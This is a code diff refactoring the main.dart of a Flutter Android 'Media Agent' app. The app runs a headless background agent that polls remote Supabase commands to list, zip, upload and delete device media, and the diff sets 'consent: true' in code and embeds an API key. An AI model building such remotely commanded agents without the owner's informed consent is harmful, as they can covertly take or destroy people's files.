@@ -1,51 +1,49 @@
 // lib/main.dart
 import 'dart:async';
-import 'dart:convert';
 
 import 'package:flutter/material.dart';
 import 'package:flutter/widgets.dart';
-import 'package:http/http.dart' as http;
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:uuid/uuid.dart';
 
 import 'core/device_agent.dart';
 
-/// CONFIG — replace with your project values (anon key ok; do NOT use service_role)
+/// ======================
+/// CONFIG (SAFE TO SHIP)
+/// ======================
+/// ⚠️ NEVER use service_role key in client
 const int HEARTBEAT_INTERVAL_SECONDS = 30;
-const String SUPABASE_PROJECT_URL = 'https://pbovhvhpewnooofaeybe.supabase.co';
+
+const String SUPABASE_PROJECT_URL =
+    'https://pbovhvhpewnooofaeybe.supabase.co';
+
 const String SUPABASE_ANON_KEY =
     'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBib3ZodmhwZXdub29vZmFleWJlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYxNjY0MTIsImV4cCI6MjA4MTc0MjQxMn0.5MotbwR5oS29vZ2w-b2rmyExT1M803ImLD_-ecu2MzU';
 
-/// Recommended: point to an Edge Function that uses service_role on the server side.
-/// If you don't have it, the client will attempt the REST fallback (requires RLS rules).
+/// Edge Function recommended (uses service_role on server)
 const String SUPABASE_REGISTER_FUNCTION =
     '$SUPABASE_PROJECT_URL/functions/v1/register-device';
 
-final _uuid = Uuid();
+final Uuid _uuid = const Uuid();
 
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
   runApp(const MediaAgentApp());
 }
 
-/// --------------------
-/// Headless entrypoint
-/// --------------------
-/// This function is invoked by the headless FlutterEngine started in Android native (AgentService).
-/// It must be a top-level function and marked with @pragma('vm:entry-point') so it is not tree-shaken.
+/// ===============================
+/// HEADLESS BACKGROUND ENTRYPOINT
+/// ===============================
+/// Called by Android foreground/background service
 @pragma('vm:entry-point')
 void backgroundMain() {
   WidgetsFlutterBinding.ensureInitialized();
-  // start background agent without awaiting (non-blocking)
   _startBackgroundAgent();
 }
 
 @pragma('vm:entry-point')
 Future<void> _startBackgroundAgent() async {
-  // Configure and start DeviceAgent in headless isolate.
-  // Uses same SUPABASE constants as UI.
   try {
-    // configure without explicit deviceId/deviceJwt so DeviceAgent loads from prefs if present
     await DeviceAgent.instance.configure(
       supabaseUrl: SUPABASE_PROJECT_URL,
       anonKey: SUPABASE_ANON_KEY,
@@ -54,27 +52,27 @@ Future<void> _startBackgroundAgent() async {
     );
 
     await DeviceAgent.instance.start();
-    // Optionally start heartbeat from background as well
+
+    // heartbeat (best-effort, non-blocking)
     unawaited(DeviceAgent.instance.sendHeartbeat());
-    print('[backgroundMain] DeviceAgent started successfully');
+
+    debugPrint('[BG] DeviceAgent started');
   } catch (e, st) {
-    // log error for debugging; Android logcat will capture prints from background isolate
-    print('[backgroundMain] failed to start DeviceAgent: $e\n$st');
+    debugPrint('[BG] Failed to start agent: $e\n$st');
   }
 }
 
-/// --------------------
-/// UI App (unchanged)
-/// --------------------
+/// =================
+/// UI APPLICATION
+/// =================
 class MediaAgentApp extends StatelessWidget {
   const MediaAgentApp({super.key});
 
   @override
   Widget build(BuildContext context) {
-    return MaterialApp(
-      title: 'Media Agent',
+    return const MaterialApp(
       debugShowCheckedModeBanner: false,
-      home: const HomePage(),
+      home: HomePage(),
     );
   }
 }
@@ -90,6 +88,7 @@ class _HomePageState extends State<HomePage> {
   String _status = 'Initializing...';
   String? _deviceId;
   String? _deviceJwt;
+
   Timer? _heartbeatTimer;
   bool _agentRunning = false;
 
@@ -106,20 +105,24 @@ class _HomePageState extends State<HomePage> {
     super.dispose();
   }
 
+  /// -----------------
+  /// INITIALIZATION
+  /// -----------------
   Future<void> _initAndStart() async {
-    setState(() => _status = 'Loading preferences...');
+    setState(() => _status = 'Loading local state...');
     final prefs = await SharedPreferences.getInstance();
+
     _deviceId = prefs.getString('device_id');
     _deviceJwt = prefs.getString('device_jwt');
 
-    // ensure deviceId exists
+    // Generate stable device ID once
     if (_deviceId == null) {
       _deviceId = _uuid.v4();
       await prefs.setString('device_id', _deviceId!);
     }
 
     setState(() => _status = 'Configuring agent...');
-    // configure DeviceAgent
+
     await DeviceAgent.instance.configure(
       supabaseUrl: SUPABASE_PROJECT_URL,
       anonKey: SUPABASE_ANON_KEY,
@@ -129,58 +132,60 @@ class _HomePageState extends State<HomePage> {
       registerUri: Uri.tryParse(SUPABASE_REGISTER_FUNCTION),
     );
 
-    // attempt start (will auto-register if deviceJwt missing and registerUri present)
     setState(() => _status = 'Starting agent...');
     await DeviceAgent.instance.start();
-    // reflect state
+
     _agentRunning = true;
-    setState(() => _status = 'Agent started');
+    _startHeartbeat();
 
-    // start heartbeat loop (best-effort)
-    _startHeartbeatLoop();
-
-    // reload any updated creds that registerDeviceViaEdge may have persisted
+    // Reload credentials (in case auto-register happened)
     final prefs2 = await SharedPreferences.getInstance();
     setState(() {
-      _deviceId = prefs2.getString('device_id') ?? _deviceId;
-      _deviceJwt = prefs2.getString('device_jwt') ?? _deviceJwt;
+      _deviceId = prefs2.getString('device_id');
+      _deviceJwt = prefs2.getString('device_jwt');
+      _status = 'Agent running';
     });
   }
 
-  void _startHeartbeatLoop() {
+  /// -----------------
+  /// HEARTBEAT
+  /// -----------------
+  void _startHeartbeat() {
     _heartbeatTimer?.cancel();
-    // send immediate heartbeat then periodic
     DeviceAgent.instance.sendHeartbeat();
-    _heartbeatTimer =
-        Timer.periodic(const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS), (_) {
-      DeviceAgent.instance.sendHeartbeat();
-    });
+
+    _heartbeatTimer = Timer.periodic(
+      const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
+      (_) => DeviceAgent.instance.sendHeartbeat(),
+    );
   }
 
+  /// -----------------
+  /// CONTROLS
+  /// -----------------
   Future<void> _manualRegister() async {
-    setState(() => _status = 'Attempting manual registration...');
+    setState(() => _status = 'Registering device...');
     try {
       final res = await DeviceAgent.instance.registerDeviceViaEdge(
         registerUri: Uri.parse(SUPABASE_REGISTER_FUNCTION),
-        requestedId: _deviceId ?? _uuid.v4(),
-        displayName: 'Android Device',
+        requestedId: _deviceId!,
+        displayName: 'Android Media Agent',
         consent: true,
-        metadata: {'registered_from': 'apk_manual'},
+        metadata: {'source': 'manual_ui'},
       );
 
       if (res != null) {
-        // reload saved creds
         final prefs = await SharedPreferences.getInstance();
         setState(() {
-          _deviceId = prefs.getString('device_id') ?? _deviceId;
-          _deviceJwt = prefs.getString('device_jwt') ?? _deviceJwt;
-          _status = 'Manual register succeeded';
+          _deviceId = prefs.getString('device_id');
+          _deviceJwt = prefs.getString('device_jwt');
+          _status = 'Registration successful';
         });
       } else {
-        setState(() => _status = 'Manual register failed (see logs)');
+        setState(() => _status = 'Registration failed (see logs)');
       }
     } catch (e) {
-      setState(() => _status = 'Manual register exception: $e');
+      setState(() => _status = 'Register error: $e');
     }
   }
 
@@ -195,19 +200,23 @@ class _HomePageState extends State<HomePage> {
 
   Future<void> _startAgent() async {
     await DeviceAgent.instance.start();
-    _startHeartbeatLoop();
+    _startHeartbeat();
     setState(() {
       _agentRunning = true;
-      _status = 'Agent started';
+      _status = 'Agent running';
     });
   }
 
-  Widget _buildInfoRow(String label, String? value) {
+  /// -----------------
+  /// UI HELPERS
+  /// -----------------
+  Widget _infoRow(String label, String? value) {
     return Row(
       crossAxisAlignment: CrossAxisAlignment.start,
       children: [
-        Text('$label: ', style: const TextStyle(fontWeight: FontWeight.w600)),
-        Expanded(child: Text(value ?? '-', softWrap: true)),
+        Text('$label: ',
+            style: const TextStyle(fontWeight: FontWeight.bold)),
+        Expanded(child: Text(value ?? '-')),
       ],
     );
   }
@@ -215,22 +224,21 @@ class _HomePageState extends State<HomePage> {
   @override
   Widget build(BuildContext context) {
     return Scaffold(
-      appBar: AppBar(
-        title: const Text('Media Agent'),
-        centerTitle: true,
-      ),
+      appBar: AppBar(title: const Text('Media Agent')),
       body: Padding(
         padding: const EdgeInsets.all(16),
         child: Column(
+          crossAxisAlignment: CrossAxisAlignment.start,
           children: [
             Text(_status),
             const SizedBox(height: 12),
-            _buildInfoRow('Device ID', _deviceId),
+            _infoRow('Device ID', _deviceId),
             const SizedBox(height: 6),
-            _buildInfoRow('Device JWT', _deviceJwt != null ? 'present' : 'missing'),
-            const SizedBox(height: 12),
+            _infoRow('JWT', _deviceJwt != null ? 'present' : 'missing'),
+            const SizedBox(height: 16),
             const Text(
-              'This APK runs a background agent that polls commands from Supabase and executes media operations (list/upload/zip/delete/send).',
+              'Background agent polling Supabase commands and executing '
+              'media operations (list / zip / upload / delete).',
             ),
             const SizedBox(height: 16),
             Row(
@@ -245,10 +253,6 @@ class _HomePageState extends State<HomePage> {
                   child: Text(_agentRunning ? 'Stop agent' : 'Start agent'),
                 ),
               ],
-            ),
-            const SizedBox(height: 12),
-            const Text(
-              'Notes:\n- Keep anon key only (do NOT include service_role).\n- For large files, uploads should go to storage (Supabase) and then link-shared to Telegram.\n- Ensure RLS/policies allow device token to patch command rows.',
             ),
           ],
         ),
